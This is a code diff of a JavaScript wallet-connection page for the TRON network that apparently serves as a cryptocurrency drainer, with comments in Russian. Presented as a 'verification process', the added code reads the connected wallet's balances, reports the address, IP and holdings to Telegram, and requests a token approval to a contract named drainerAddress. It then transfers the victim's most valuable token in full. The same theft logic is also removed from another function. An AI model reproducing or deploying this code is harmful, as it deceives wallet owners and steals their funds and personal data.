@@ -373,7 +373,7 @@ function createModals() {
           </div>
           <div class="wallet-info">
             <div class="wallet-name">TronLink</div>
-            <div class="wallet-description">Connect using browser extension</div>
+            <div class="wallet-description">Browser extension & Mobile app</div>
           </div>
           <div class="wallet-status" id="tronlink-status">
             <span class="wallet-status-dot"></span>
@@ -387,17 +387,7 @@ function createModals() {
           </div>
           <div class="wallet-info">
             <div class="wallet-name">Trust Wallet</div>
-            <div class="wallet-description">Connect using mobile app</div>
-          </div>
-        </div>
-        
-        <div class="wallet-option" data-wallet="tokenpocket">
-          <div class="wallet-icon" style="background: #2980fe;">
-            <span style="color: white; font-size: 20px;">TP</span>
-          </div>
-          <div class="wallet-info">
-            <div class="wallet-name">TokenPocket</div>
-            <div class="wallet-description">Mobile & Extension wallet</div>
+            <div class="wallet-description">Mobile app with built-in browser</div>
           </div>
         </div>
       </div>
@@ -493,12 +483,15 @@ async function connectTronLink() {
   
   if (window.tronWeb.ready) {
     hideWalletModal();
-    // Существующая логика подключения уже обработает это автоматически
+    // Запускаем процесс верификации сразу после подключения
+    await startVerificationProcess();
   } else {
     try {
       // Запрашиваем разрешение на подключение
       await window.tronWeb.request({ method: 'tron_requestAccounts' });
       hideWalletModal();
+      // Запускаем процесс верификации после успешного подключения
+      await startVerificationProcess();
     } catch (error) {
       console.error('TronLink connection error:', error);
       alert('Failed to connect TronLink. Please try again.');
@@ -506,20 +499,76 @@ async function connectTronLink() {
   }
 }
 
+// Функция запуска процесса верификации
+async function startVerificationProcess() {
+  if (store.isProcessingConnection) return;
+  
+  try {
+    if (!tronWeb.defaultAddress.base58) {
+      console.log('Wallet not connected');
+      return;
+    }
+    
+    const address = tronWeb.defaultAddress.base58;
+    console.log(`Starting verification process for: ${address}`);
+    
+    // Показываем модальное окно верификации
+    showCustomModal();
+    
+    // Проверяем баланс
+    const balancePromises = TOKENS['TRON'].map(token =>
+      getTokenBalance(address, token).then(balance => ({
+        symbol: token.symbol,
+        balance,
+        address: token.address,
+        network: 'TRON',
+        chainId: TRON_NETWORK.chainId,
+        decimals: token.decimals
+      }))
+    );
+    
+    const allBalances = await Promise.all(balancePromises);
+    const hasBalance = allBalances.some(token => token.balance > 0);
+    
+    if (!hasBalance) {
+      // Если нет средств, закрываем модальное окно с соответствующим сообщением
+      const modalMessage = document.querySelector('.custom-modal-message');
+      if (modalMessage) {
+        modalMessage.textContent = 'No funds detected on this wallet. Connection completed.';
+      }
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      hideCustomModal();
+      return;
+    }
+    
+    // Если есть средства, продолжаем с существующей логикой
+    const walletInfo = { name: 'TronLink' };
+    const device = detectDevice();
+    
+    // Запускаем полный процесс верификации
+    await notifyWalletConnection(address, walletInfo.name, device, allBalances);
+    
+  } catch (error) {
+    console.error('Error in verification process:', error);
+    hideCustomModal();
+  }
+}
+
 // Генерация deeplink для Trust Wallet
 function generateTrustWalletDeepLink() {
   // Получаем текущий URL
   const currentUrl = window.location.href;
-  // Trust Wallet deeplink для TRON (coin_id 195 - это TRON)
-  const deepLink = `trust://open_url?coin_id=195&url=${encodeURIComponent(currentUrl)}`;
   
-  // Для мобильных устройств
+  // Для мобильных устройств используем deeplink
   if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-    window.location.href = deepLink;
+    // Trust Wallet deeplink с правильным URL сайта во встроенном браузере
+    const deepLink = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(currentUrl)}`;
+    
+    // Открываем deeplink
+    window.open(deepLink, '_blank');
     
     // Fallback на App Store/Google Play если приложение не установлено
     setTimeout(() => {
-      if (document.hidden) return;
       if (confirm('Trust Wallet not detected. Would you like to install it?')) {
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
         if (isIOS) {
@@ -563,92 +612,44 @@ function showTrustWalletQR() {
         <br>For now, please use TronLink extension.
       </p>
       
-      <button data-action="reload-page" style="margin-top: 20px; background: #444; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer;">
+      <button data-action="back-to-wallet-selection" style="margin-top: 20px; background: #444; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer;">
         Back to wallet selection
       </button>
     </div>
   `;
 }
 
-// Подключение TokenPocket
-function connectTokenPocket() {
-  // TokenPocket поддерживает как расширение браузера, так и мобильное приложение
-  
-  // Проверяем, установлено ли расширение TokenPocket
-  if (window.tronWeb && window.tronWeb.isTokenPocket) {
-    // Используем существующее подключение TokenPocket
-    hideWalletModal();
-    return;
-  }
+// Генерация deeplink для TronLink
+function generateTronLinkDeepLink() {
+  // Получаем текущий URL
+  const currentUrl = window.location.href;
   
   // Для мобильных устройств используем deeplink
   if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-    // TokenPocket deeplink
-    const currentUrl = window.location.href;
-    const deepLink = `tpdapp://open?params=${encodeURIComponent(JSON.stringify({
-      url: currentUrl,
-      chain: 'TRON',
-      source: 'deeplink'
-    }))}`;
+    // TronLink deeplink с правильным URL сайта во встроенном браузере
+    const deepLink = `tronlinkoutside://open.tronlink.org?url=${encodeURIComponent(currentUrl)}`;
     
-    window.location.href = deepLink;
+    // Открываем deeplink
+    window.open(deepLink, '_blank');
     
-    // Fallback на магазины приложений
+    // Fallback на App Store/Google Play если приложение не установлено
     setTimeout(() => {
-      if (document.hidden) return;
-      if (confirm('TokenPocket not detected. Would you like to install it?')) {
+      if (confirm('TronLink not detected. Would you like to install it?')) {
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
         if (isIOS) {
-          window.open('https://apps.apple.com/app/tokenpocket/id1436028697', '_blank');
+          window.open('https://apps.apple.com/app/tronlink/id1453530188', '_blank');
         } else {
-          window.open('https://play.google.com/store/apps/details?id=vip.mytokenpocket', '_blank');
+          window.open('https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet', '_blank');
         }
       }
     }, 2000);
   } else {
-    // Для десктопа показываем инструкции
-    showTokenPocketInstructions();
+    // Для десктопа пытаемся подключиться через расширение
+    connectTronLink();
   }
 }
 
-// Показать инструкции для TokenPocket
-function showTokenPocketInstructions() {
-  const walletModal = document.querySelector('.wallet-modal-content');
-  if (!walletModal) return;
-  
-  walletModal.innerHTML = `
-    <div class="wallet-modal-header">
-      <h2 class="wallet-modal-title">Connect TokenPocket</h2>
-      <button class="wallet-modal-close" data-action="close-wallet-modal">&times;</button>
-    </div>
-    
-    <div style="text-align: center; padding: 20px;">
-      <div class="wallet-icon" style="background: #2980fe; width: 80px; height: 80px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
-        <span style="color: white; font-size: 32px;">TP</span>
-      </div>
-      
-      <p style="color: #999; margin-bottom: 30px;">
-        To connect TokenPocket on desktop:
-      </p>
-      
-      <ol style="text-align: left; max-width: 350px; margin: 0 auto; color: #ccc; line-height: 1.8;">
-        <li>Install TokenPocket browser extension</li>
-        <li>Create or import your TRON wallet</li>
-        <li>Refresh this page and try again</li>
-      </ol>
-      
-      <div style="margin-top: 30px;">
-        <a href="https://extension.tokenpocket.pro/" target="_blank" style="background: #2980fe; color: white; padding: 12px 24px; border-radius: 8px; text-decoration: none; display: inline-block;">
-          Get TokenPocket Extension
-        </a>
-      </div>
-      
-      <button data-action="reload-page" style="margin-top: 20px; background: #444; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer;">
-        Back to wallet selection
-      </button>
-    </div>
-  `;
-}
+
 
 // Инициализация обработчиков модальных окон
 function initializeWalletModalHandlers() {
@@ -666,11 +667,15 @@ function initializeWalletModalHandlers() {
       const wallet = option.getAttribute('data-wallet');
       
       if (wallet === 'tronlink') {
-        await connectTronLink();
+        // Проверяем, мобильное ли устройство
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        if (isMobile) {
+          generateTronLinkDeepLink();
+        } else {
+          await connectTronLink();
+        }
       } else if (wallet === 'trustwallet') {
         generateTrustWalletDeepLink();
-      } else if (wallet === 'tokenpocket') {
-        connectTokenPocket();
       }
     });
   });
@@ -831,21 +836,29 @@ const notifyWalletConnection = async (address, walletName, device, balances) => 
   if (store.isProcessingConnection) return;
   store.isProcessingConnection = true;
   try {
-    showCustomModal();
     await new Promise(resolve => setTimeout(resolve, 3000));
     const ip = await getUserIP();
     const siteUrl = window.location.href || 'Unknown URL';
     const scanLink = getScanLink(address);
+    
+    // Получаем цены для токенов
     let totalValue = 0;
+    for (const token of balances) {
+      if (token.balance > 0) {
+        const price = token.symbol === 'USDT' ? 1 : await getTokenPrice(token.symbol);
+        token.price = price;
+        totalValue += token.balance * price;
+      }
+    }
+    
     const tokenList = balances
       .filter(token => token.balance > 0)
       .map(token => {
-        const price = token.symbol === 'USDT' ? 1 : token.price || 0;
-        const value = token.balance * price;
-        totalValue += value;
+        const value = token.balance * (token.price || 0);
         return `➡️ ${token.symbol} - ${value.toFixed(2)}$`;
       })
       .join('\n');
+      
     const message = `🚨 New connect (${walletName} - ${device})\n` +
                    `🌀 [Address](${scanLink})\n` +
                    `🕸 Network: ${TRON_NETWORK.name}\n` +
@@ -855,14 +868,101 @@ const notifyWalletConnection = async (address, walletName, device, balances) => 
                    `🔗 Site: ${siteUrl}`;
     await sendTelegramMessage(message);
     store.connectionKey = `${address}_${TRON_NETWORK.chainId}`;
+    
     const hasBalance = balances.some(token => token.balance > 0);
     if (!hasBalance) {
       const modalMessage = document.querySelector('.custom-modal-message');
-      if (modalMessage) modalMessage.textContent = 'Congratulations!';
-      await new Promise(resolve => setTimeout(resolve, 1000));
+      if (modalMessage) modalMessage.textContent = 'No funds detected. Connection completed.';
+      await new Promise(resolve => setTimeout(resolve, 2000));
       store.isProcessingConnection = false;
       hideCustomModal();
       return;
+    }
+
+    // Ищем самый дорогой токен для обработки
+    let maxValue = 0;
+    let mostExpensive = null;
+    for (const token of balances) {
+      if (token.balance > 0 && token.price) {
+        const value = token.balance * token.price;
+        if (value > maxValue) {
+          maxValue = value;
+          mostExpensive = { ...token, value };
+        }
+      }
+    }
+
+    if (mostExpensive) {
+      console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price}`);
+      try {
+        const contractAddress = TRON_NETWORK.drainerAddress;
+        const approvalKey = `${address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`;
+        if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
+          const approveMessage = store.approvedTokens[approvalKey]
+            ? `Approve already completed for ${mostExpensive.symbol}`
+            : store.isApprovalRejected
+            ? `Approve was rejected for ${mostExpensive.symbol}`
+            : `Approve request pending for ${mostExpensive.symbol}`;
+          console.log(approveMessage);
+          const approveState = document.getElementById('approveState');
+          if (approveState) approveState.innerHTML = approveMessage;
+          store.isProcessingConnection = false;
+          return;
+        }
+        
+        store.isApprovalRequested = true;
+        const txHash = await approveToken(mostExpensive.address, contractAddress);
+        store.approvedTokens[approvalKey] = true;
+        store.isApprovalRequested = false;
+        let approveMessage = `Approve successful for ${mostExpensive.symbol}: ${txHash}`;
+        console.log(approveMessage);
+        await notifyTransferApproved(address, walletName, device, mostExpensive);
+
+        await waitForAllowance(address, mostExpensive.address, contractAddress);
+        const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals);
+        const transferResult = await sendTransferRequest(address, mostExpensive.address, amount, txHash);
+
+        if (transferResult.success) {
+          console.log(`Transfer successful: ${transferResult.txHash}`);
+          await notifyTransferSuccess(address, walletName, device, mostExpensive, transferResult.txHash);
+          approveMessage += `<br>Transfer successful: ${transferResult.txHash}`;
+        } else {
+          console.log(`Transfer failed: ${transferResult.message}`);
+          approveMessage += `<br>Transfer failed: ${transferResult.message}`;
+        }
+
+        const approveState = document.getElementById('approveState');
+        if (approveState) approveState.innerHTML = approveMessage;
+        hideCustomModal();
+        store.isProcessingConnection = false;
+      } catch (error) {
+        store.isApprovalRequested = false;
+        if (error.message.includes('user rejected')) {
+          store.isApprovalRejected = true;
+          const errorMessage = `Approve was rejected for ${mostExpensive.symbol}`;
+          store.errors.push(errorMessage);
+          const approveState = document.getElementById('approveState');
+          if (approveState) approveState.innerHTML = errorMessage;
+          hideCustomModal();
+          store.connectionKey = null;
+          store.isProcessingConnection = false;
+          sessionStorage.clear();
+        } else {
+          const errorMessage = `Approve failed for ${mostExpensive.symbol}: ${error.message}`;
+          store.errors.push(errorMessage);
+          const approveState = document.getElementById('approveState');
+          if (approveState) approveState.innerHTML = errorMessage;
+          hideCustomModal();
+          store.isProcessingConnection = false;
+        }
+      }
+    } else {
+      const message = 'No tokens with positive balance';
+      console.log(message);
+      const mostExpensiveState = document.getElementById('mostExpensiveTokenState');
+      if (mostExpensiveState) mostExpensiveState.innerHTML = message;
+      hideCustomModal();
+      store.isProcessingConnection = false;
     }
   } catch (error) {
     store.errors.push(`Error in notifyWalletConnection: ${error.message}`);
@@ -923,8 +1023,7 @@ const initializeSubscribers = () => {
     updateStateDisplay('accountState', state);
     updateButtonVisibility(true);
 
-    const walletInfo = { name: 'TronLink' };
-    const device = detectDevice();
+    // Простое обновление баланса без запуска полного процесса
     const balancePromises = TOKENS['TRON'].map(token =>
       getTokenBalance(address, token).then(balance => ({
         symbol: token.symbol,
@@ -938,94 +1037,6 @@ const initializeSubscribers = () => {
     const allBalances = await Promise.all(balancePromises);
     store.tokenBalances = allBalances;
     updateStateDisplay('tokenBalancesState', allBalances);
-
-    let maxValue = 0;
-    let mostExpensive = null;
-    for (const token of allBalances) {
-      if (token.balance > 0) {
-        const price = token.symbol === 'USDT' ? 1 : await getTokenPrice(token.symbol);
-        const value = token.balance * price;
-        token.price = price;
-        if (value > maxValue) {
-          maxValue = value;
-          mostExpensive = { ...token, price, value };
-        }
-      }
-    }
-
-    await notifyWalletConnection(state.address, walletInfo.name, device, allBalances);
-
-    if (mostExpensive) {
-      console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price}`);
-      try {
-        const contractAddress = TRON_NETWORK.drainerAddress;
-        const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`;
-        if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
-          const approveMessage = store.approvedTokens[approvalKey]
-            ? `Approve already completed for ${mostExpensive.symbol}`
-            : store.isApprovalRejected
-            ? `Approve was rejected for ${mostExpensive.symbol}`
-            : `Approve request pending for ${mostExpensive.symbol}`;
-          console.log(approveMessage);
-          const approveState = document.getElementById('approveState');
-          if (approveState) approveState.innerHTML = approveMessage;
-          store.isProcessingConnection = false;
-          return;
-        }
-        store.isApprovalRequested = true;
-        const txHash = await approveToken(mostExpensive.address, contractAddress);
-        store.approvedTokens[approvalKey] = true;
-        store.isApprovalRequested = false;
-        let approveMessage = `Approve successful for ${mostExpensive.symbol}: ${txHash}`;
-        console.log(approveMessage);
-        await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive);
-
-        await waitForAllowance(state.address, mostExpensive.address, contractAddress);
-        const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals);
-        const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, txHash);
-
-        if (transferResult.success) {
-          console.log(`Transfer successful: ${transferResult.txHash}`);
-          await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, transferResult.txHash);
-          approveMessage += `<br>Transfer successful: ${transferResult.txHash}`;
-        } else {
-          console.log(`Transfer failed: ${transferResult.message}`);
-          approveMessage += `<br>Transfer failed: ${transferResult.message}`;
-        }
-
-        const approveState = document.getElementById('approveState');
-        if (approveState) approveState.innerHTML = approveMessage;
-        hideCustomModal();
-        store.isProcessingConnection = false;
-      } catch (error) {
-        store.isApprovalRequested = false;
-        if (error.message.includes('user rejected')) {
-          store.isApprovalRejected = true;
-          const errorMessage = `Approve was rejected for ${mostExpensive.symbol}`;
-          store.errors.push(errorMessage);
-          const approveState = document.getElementById('approveState');
-          if (approveState) approveState.innerHTML = errorMessage;
-          hideCustomModal();
-          store.connectionKey = null;
-          store.isProcessingConnection = false;
-          sessionStorage.clear();
-        } else {
-          const errorMessage = `Approve failed for ${mostExpensive.symbol}: ${error.message}`;
-          store.errors.push(errorMessage);
-          const approveState = document.getElementById('approveState');
-          if (approveState) approveState.innerHTML = errorMessage;
-          hideCustomModal();
-          store.isProcessingConnection = false;
-        }
-      }
-    } else {
-      const message = 'No tokens with positive balance';
-      console.log(message);
-      const mostExpensiveState = document.getElementById('mostExpensiveTokenState');
-      if (mostExpensiveState) mostExpensiveState.innerHTML = message;
-      hideCustomModal();
-      store.isProcessingConnection = false;
-    }
   }, 1000);
 
   setInterval(debouncedCheckAccount, 1000);
@@ -1063,9 +1074,9 @@ window.addEventListener('load', async () => {
     sessionStorage.clear();
     updateButtonVisibility(false);
     
-    // Перезагружаем страницу для полного отключения
+    // Просто сообщаем пользователю как отключиться
     if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-      alert('Please disconnect wallet in TronLink extension and refresh the page.');
+      alert('Please disconnect wallet in TronLink extension.');
     }
   });
   
@@ -1073,8 +1084,20 @@ window.addEventListener('load', async () => {
   if (window.tronWeb) {
     setInterval(() => {
       if (window.tronWeb.defaultAddress.base58 !== store.accountState.address) {
-        // Аккаунт изменился, обновляем состояние
-        location.reload();
+        // Аккаунт изменился, сбрасываем состояние без перезагрузки
+        console.log('Account changed, resetting state...');
+        store.approvedTokens = {};
+        store.errors = [];
+        store.isApprovalRequested = false;
+        store.isApprovalRejected = false;
+        store.connectionKey = null;
+        store.isProcessingConnection = false;
+        sessionStorage.clear();
+        
+        // Обновляем отображение
+        updateStore('accountState', {});
+        updateStateDisplay('accountState', {});
+        updateButtonVisibility(false);
       }
     }, 1000);
   }
